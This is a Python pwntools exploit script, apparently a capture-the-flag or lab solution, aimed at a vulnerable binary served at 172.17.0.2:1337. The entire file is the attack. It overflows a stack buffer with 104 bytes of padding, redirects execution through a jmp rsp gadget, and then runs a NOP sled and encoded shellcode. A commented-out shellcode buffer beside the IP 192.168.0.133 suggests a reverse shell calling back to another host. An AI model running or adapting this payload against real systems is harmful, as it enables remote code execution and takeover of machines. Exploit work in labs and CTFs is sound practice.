#!/usr/bin/env python3
from time import sleep
import pwn
import binascii
pwn.context.terminal = ['tmux','splitw', '-h']
pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

bPoint = 'b main'
gdb_command = bPoint

LOCAL = False
DEBUG = False
if DEBUG:
    p = pwn.gdb.debug('./vuln', gdb_command)
elif LOCAL:
    p = pwn.process('./vuln')
else:
    p = pwn.remote('172.17.0.2', 1337)
sleep(1)

#192.168.0.133
#buf =  b""
#buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
#buf += b"\x05\xef\xff\xff\xff\x48\xbb\xab\x3c\xc0\x9c\xbc"
#buf += b"\x38\xe2\x77\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
#buf += b"\xff\xe2\xf4\xc1\x15\x98\x05\xd6\x3a\xbd\x1d\xaa"
#buf += b"\x62\xcf\x99\xf4\xaf\xaa\xce\xa9\x3c\xe3\xb5\x7c"
#buf += b"\x90\xe2\xf2\xfa\x74\x49\x7a\xd6\x28\xb8\x1d\x81"
#buf += b"\x64\xcf\x99\xd6\x3b\xbc\x3f\x54\xf2\xaa\xbd\xe4"
#buf += b"\x37\xe7\x02\x5d\x56\xfb\xc4\x25\x70\x59\x58\xc9"
#buf += b"\x55\xae\xb3\xcf\x50\xe2\x24\xe3\xb5\x27\xce\xeb"
#buf += b"\x70\x6b\x91\xa4\x39\xc0\x9c\xbc\x38\xe2\x77"


buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xa5\x4d\x14\x8f\x9d"
buf += b"\xc0\xc3\x29\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xcf\x64\x4c\x16\xf7\xc2\x9c\x43\xa4"
buf += b"\x13\x1b\x8a\xd5\x57\x8b\x90\xa7\x4d\x37\xa6\x31"
buf += b"\xd1\xc3\x28\xf4\x05\x9d\x69\xf7\xd0\x99\x43\x8f"
buf += b"\x15\x1b\x8a\xf7\xc3\x9d\x61\x5a\x83\x7e\xae\xc5"
buf += b"\xcf\xc6\x5c\x53\x27\x2f\xd7\x04\x88\x78\x06\xc7"
buf += b"\x24\x7a\xa0\xee\xa8\xc3\x7a\xed\xc4\xf3\xdd\xca"
buf += b"\x88\x4a\xcf\xaa\x48\x14\x8f\x9d\xc0\xc3\x29"


offset_to_rip = 96 + 8
nops = b"\x90" * 200


#jmp_rsp_addr = pwn.p64(0x7fffffffdd00)
jmp_rsp = 0x40132c

payload  = b"A" * offset_to_rip
payload += pwn.p64(jmp_rsp)
payload += nops + buf

p.recvuntil(b'Username:')
#p.sendline("root")
#p.recvuntil(b'Password:')
p.sendline(payload + b'\n')
p.sendline(b'Password:')
p.sendline(b'-1')


p.interactive()
